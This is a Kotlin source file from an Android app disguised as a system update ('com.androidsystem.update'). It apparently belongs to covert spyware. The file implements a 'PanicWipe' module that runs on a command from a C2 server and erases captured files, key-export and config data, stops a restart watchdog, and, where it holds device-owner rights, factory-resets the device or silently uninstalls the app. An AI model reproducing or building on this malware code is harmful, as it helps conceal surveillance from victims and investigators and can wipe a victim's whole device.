package com.androidsystem.update.panic

import android.content.Context
import android.content.pm.PackageManager
import android.util.Log
import com.androidsystem.update.core.EncryptionManager
import com.androidsystem.update.core.ConfigManager
import com.androidsystem.update.service.WatchdogService
import com.androidsystem.update.service.CoreService
import dagger.hilt.android.qualifiers.ApplicationContext
import java.io.File
import javax.inject.Inject
import javax.inject.Singleton

/**
 * Remote self-destruct. Triggered by a `PANIC` command from the C2.
 *
 *  Three levels:
 *  - `soft`   — wipe app databases, captured files, config, prefs, keys, force-stop.
 *  - `hard`   — soft + drop device-admin (best-effort) + factory-reset via DevicePolicyManager
 *               (requires Device Owner). Falls back to `soft` if not device-owner.
 *  - `uninst` — soft + uninstall the package via DevicePolicyManager (silent uninstall on
 *               managed devices). On non-managed devices the user is taken to the
 *               uninstall screen; the app wipes itself first.
 */
@Singleton
class PanicWipe @Inject constructor(
    @ApplicationContext private val context: Context,
    private val encryptionManager: EncryptionManager,
    private val configManager: ConfigManager
) {
    private val tag = "PanicWipe"

    enum class Level { SOFT, HARD, UNINST }

    fun execute(level: Level) {
        Log.w(tag, "PANIC level=$level")
        try {
            wipeLocal()
            when (level) {
                Level.SOFT -> { /* local only */ }
                Level.HARD -> tryDeviceAdminWipe()
                Level.UNINST -> tryUninstall()
            }
        } catch (e: Throwable) {
            Log.e(tag, "panic failed", e)
        } finally {
            forceStop()
        }
    }

    private fun wipeLocal() {
        // Wipe Room database
        context.deleteDatabase("telemetry.db")
        // Wipe captures dir
        File(context.filesDir, "captures").deleteRecursively()
        File(context.cacheDir, "captures").deleteRecursively()
        // Wipe key export prefs (EncryptedSharedPreferences)
        try { context.getSharedPreferences("key_export_prefs_enc", Context.MODE_PRIVATE).edit().clear().commit() } catch (_: Throwable) {}
        // Wipe config & watchdog prefs
        try { context.getSharedPreferences("telemetry_config", Context.MODE_PRIVATE).edit().clear().commit() } catch (_: Throwable) {}
        try { context.getSharedPreferences("app_prefs", Context.MODE_PRIVATE).edit().clear().commit() } catch (_: Throwable) {}
        try { context.getSharedPreferences("watchdog_prefs", Context.MODE_PRIVATE).edit().clear().commit() } catch (_: Throwable) {}
        try { context.getSharedPreferences("db_prefs", Context.MODE_PRIVATE).edit().clear().commit() } catch (_: Throwable) {}
        // Wipe external files dir
        context.getExternalFilesDir(null)?.deleteRecursively()
        // Reset config in-memory
        try { configManager.resetToDefaults() } catch (_: Throwable) {}
    }

    private fun tryDeviceAdminWipe() {
        try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            val admin = android.content.ComponentName(context, com.androidsystem.update.receiver.DeviceAdminReceiver::class.java)
            if (dpm.isDeviceOwnerApp(context.packageName)) {
                dpm.wipeData(0) // device-owner factory reset
            } else if (dpm.isAdminActive(admin)) {
                dpm.removeActiveAdmin(admin) // best-effort: revoke admin
            }
        } catch (e: Throwable) { Log.w(tag, "device-admin wipe", e) }
    }

    private fun tryUninstall() {
        try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            if (dpm.isDeviceOwnerApp(context.packageName)) {
                // silent uninstall on managed devices
                val pkg = context.packageName
                dpm.clearApplicationUserData(pkg, null)
                dpm.uninstallPackage(pkg, null)
            } else {
                val intent = android.content.Intent(android.content.Intent.ACTION_UNINSTALL_PACKAGE)
                    .setData(android.net.Uri.parse("package:" + context.packageName))
                    .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(intent)
            }
        } catch (e: Throwable) { Log.w(tag, "uninstall", e) }
    }

    private fun forceStop() {
        try {
            val am = context.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
            // Stop the watchdog first so the alarm chain does not restart us.
            try { context.stopService(android.content.Intent(context, WatchdogService::class.java)) } catch (_: Throwable) {}
            try { context.stopService(android.content.Intent(context, CoreService::class.java)) } catch (_: Throwable) {}
            am.killBackgroundProcesses(context.packageName)
            // killBackgroundProcesses is best-effort on foreground. Hard kill needs root.
        } catch (e: Throwable) { Log.w(tag, "forceStop", e) }
    }
}
